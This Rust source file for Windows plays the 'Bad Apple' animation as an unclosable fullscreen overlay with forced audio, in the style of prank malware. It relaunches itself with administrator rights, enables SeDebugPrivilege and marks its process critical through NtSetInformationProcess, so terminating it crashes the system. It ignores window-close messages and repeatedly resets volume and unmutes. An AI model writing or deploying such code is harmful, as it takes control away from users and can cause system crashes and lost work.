#![windows_subsystem = "windows"]

use kira::{
    clock::ClockSpeed,
    manager::{backend::DefaultBackend, AudioManager, AudioManagerSettings},
    sound::streaming::{StreamingSoundData, StreamingSoundSettings},
};
use std::{env, ffi::c_void, io::Cursor, mem, slice, thread, time::Duration};

use windows::Win32::Graphics::Gdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateSolidBrush, FillRect, GetDC,
    SelectObject, SRCCOPY,
};
use windows::Win32::Media::Audio::Endpoints::IAudioEndpointVolume;
use windows::Win32::Media::Audio::{eConsole, eRender, IMMDeviceEnumerator, MMDeviceEnumerator};
use windows::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use windows::Win32::System::Com::{CoCreateInstance, CoInitialize, CoUninitialize, CLSCTX_ALL};
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows::Win32::UI::HiDpi::{
    SetProcessDpiAwarenessContext, DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2,
};
use windows::Win32::UI::Shell::{IsUserAnAdmin, ShellExecuteW};
use windows::Win32::UI::WindowsAndMessaging::{
    CreateWindowExA, DefWindowProcA, DispatchMessageA, GetSystemMetrics, PeekMessageA,
    PostQuitMessage, RegisterClassA, SetLayeredWindowAttributes, TranslateMessage, LWA_COLORKEY,
    MSG, PM_REMOVE, SM_CXSCREEN, SM_CYSCREEN, WM_CLOSE, WM_DESTROY, WM_QUIT, WNDCLASSA,
    WS_EX_LAYERED, WS_EX_TOOLWINDOW, WS_EX_TOPMOST, WS_EX_TRANSPARENT, WS_MAXIMIZE, WS_POPUP,
    WS_VISIBLE,
};
use windows::Win32::{
    Foundation::{COLORREF, HANDLE, HINSTANCE, HWND, LPARAM, LRESULT, RECT, WPARAM},
    UI::WindowsAndMessaging::SW_HIDE,
};
use windows::{core::s, core::w};

const BASE_WIDTH: u16 = 1024;
const BASE_HEIGHT: u16 = 768;
const TRANSPARENT_COLOR: u32 = 0x00FF00FF;
const PROCESS_BREAK_ON_TERMINATION: u32 = 0x1D;

#[repr(packed)]
#[derive(Debug, Copy, Clone)]
pub struct RawWinCoords {
    x: u16,
    y: u16,
    w: u16,
    h: u16,
}

#[link(name = "ntdll")]
extern "system" {
    fn NtSetInformationProcess(h: HANDLE, c: u32, p: *const c_void, l: u32) -> i32;
}

// --- HELPERS ---

pub fn init_console() {
    unsafe {
        let _ = SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
        windows::Win32::Media::timeBeginPeriod(1);
    }
}

unsafe extern "system" fn wnd_proc(hwnd: HWND, msg: u32, w: WPARAM, l: LPARAM) -> LRESULT {
    match msg {
        WM_CLOSE => LRESULT(0),
        WM_DESTROY => {
            PostQuitMessage(0);
            LRESULT(0)
        }
        _ => DefWindowProcA(hwnd, msg, w, l),
    }
}

unsafe fn get_volume_control() -> Option<IAudioEndpointVolume> {
    let enumerator: IMMDeviceEnumerator =
        CoCreateInstance(&MMDeviceEnumerator, None, CLSCTX_ALL).ok()?;
    let device = enumerator.GetDefaultAudioEndpoint(eRender, eConsole).ok()?;
    device.Activate(CLSCTX_ALL, None).ok()
}

fn set_critical(critical: bool) {
    unsafe {
        let mut value: u32 = if critical { 1 } else { 0 };
        let _ = NtSetInformationProcess(
            GetCurrentProcess(),
            PROCESS_BREAK_ON_TERMINATION,
            &mut value as *mut _ as *mut c_void,
            mem::size_of::<u32>() as u32,
        );
    }
}

fn enable_privilege() -> bool {
    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        )
        .is_err()
        {
            return false;
        }
        let mut luid = windows::Win32::Foundation::LUID::default();
        if LookupPrivilegeValueA(None, s!("SeDebugPrivilege"), &mut luid).is_err() {
            return false;
        }
        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        AdjustTokenPrivileges(token, false, Some(&tp), 0, None, None).is_ok()
    }
}

// --- MAIN ---

fn main() {
    unsafe {
        let _ = CoInitialize(None);
    }

    let is_admin = unsafe { IsUserAnAdmin() }.as_bool();
    let args: Vec<String> = env::args().collect();

    // SELF-ELEVATION LOGIC
    if !is_admin && !args.contains(&"--no-elevate".to_string()) {
        let path = env::current_exe().unwrap();
        let path_w: Vec<u16> = path
            .to_str()
            .unwrap()
            .encode_utf16()
            .chain(Some(0))
            .collect();
        unsafe {
            let res = ShellExecuteW(
                None,
                w!("runas"),
                windows::core::PCWSTR(path_w.as_ptr()),
                w!("--no-elevate"),
                None,
                SW_HIDE,
            );
            if res.0 as usize > 32 {
                return;
            } // Exit if user clicked "Yes" (new admin process started)
        }
    }

    init_console();
    if is_admin && enable_privilege() {
        set_critical(true);
    }

    unsafe {
        let instance: HINSTANCE = GetModuleHandleA(None).unwrap().into();
        let class_name = s!("BadAppleClass");
        let wc = WNDCLASSA {
            lpfnWndProc: Some(wnd_proc),
            hInstance: instance,
            lpszClassName: class_name,
            hbrBackground: CreateSolidBrush(COLORREF(TRANSPARENT_COLOR)),
            ..Default::default()
        };
        RegisterClassA(&wc);

        let overlay_hwnd = CreateWindowExA(
            WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
            class_name,
            s!(""),
            WS_POPUP | WS_VISIBLE | WS_MAXIMIZE,
            0,
            0,
            0,
            0,
            None,
            None,
            instance,
            None,
        );
        let _ =
            SetLayeredWindowAttributes(overlay_hwnd, COLORREF(TRANSPARENT_COLOR), 0, LWA_COLORKEY);

        let frames_raw = include_bytes!("../assets/boxes.bin");
        let frames: &[RawWinCoords] = slice::from_raw_parts(
            frames_raw.as_ptr() as *const _,
            frames_raw.len() / mem::size_of::<RawWinCoords>(),
        );
        let mut frames_iter = frames.iter();

        let mut manager = AudioManager::<DefaultBackend>::new(AudioManagerSettings::default())
            .expect("Audio Fail");
        let clock = manager.add_clock(ClockSpeed::TicksPerSecond(30.0)).unwrap();
        let sound_data = StreamingSoundData::from_cursor(
            Cursor::new(include_bytes!("../assets/bad apple.ogg")),
            StreamingSoundSettings::new().start_time(clock.time()),
        )
        .unwrap();
        manager.play(sound_data).unwrap();
        clock.start().unwrap();

        let volume_ctl = get_volume_control();
        let screen_w = GetSystemMetrics(SM_CXSCREEN);
        let screen_h = GetSystemMetrics(SM_CYSCREEN);
        let (rx, ry) = (
            screen_w as f32 / BASE_WIDTH as f32,
            screen_h as f32 / BASE_HEIGHT as f32,
        );

        let window_dc = GetDC(overlay_hwnd);
        let (mem_dc, mem_bm) = (
            CreateCompatibleDC(window_dc),
            CreateCompatibleBitmap(window_dc, screen_w, screen_h),
        );
        SelectObject(mem_dc, mem_bm);
        let (white_brush, clear_brush) = (
            CreateSolidBrush(COLORREF(0xFFFFFF)),
            CreateSolidBrush(COLORREF(TRANSPARENT_COLOR)),
        );

        let mut next_tick = clock.time().ticks;

        'main_loop: loop {
            // Volume control safety check
            if let Some(ref v) = volume_ctl {
                let _ = v.SetMasterVolumeLevelScalar(0.5, std::ptr::null());
                let _ = v.SetMute(false, std::ptr::null());
            }

            let mut msg = MSG::default();
            while PeekMessageA(&mut msg, None, 0, 0, PM_REMOVE).as_bool() {
                if msg.message == WM_QUIT {
                    break 'main_loop;
                }
                TranslateMessage(&msg);
                DispatchMessageA(&msg);
            }

            let current_tick = clock.time().ticks;
            if current_tick >= next_tick {
                while current_tick > next_tick {
                    for c in frames_iter.by_ref() {
                        if c.w == 0 && c.h == 0 {
                            break;
                        }
                    }
                    next_tick += 1;
                }
                FillRect(
                    mem_dc,
                    &RECT {
                        left: 0,
                        top: 0,
                        right: screen_w,
                        bottom: screen_h,
                    },
                    clear_brush,
                );
                loop {
                    let c = match frames_iter.next() {
                        Some(coords) => coords,
                        None => break 'main_loop,
                    };
                    if c.w == 0 && c.h == 0 {
                        break;
                    }
                    let dr = RECT {
                        left: (c.x as f32 * rx) as i32,
                        top: (c.y as f32 * ry) as i32,
                        right: ((c.x + c.w) as f32 * rx) as i32 + 1,
                        bottom: ((c.y + c.h) as f32 * ry) as i32 + 1,
                    };
                    FillRect(mem_dc, &dr, white_brush);
                }
                let _ = BitBlt(window_dc, 0, 0, screen_w, screen_h, mem_dc, 0, 0, SRCCOPY);
                next_tick += 1;
            }
            thread::sleep(Duration::from_millis(1));
        }
        if is_admin {
            set_critical(false);
        }
        CoUninitialize();
    }
}
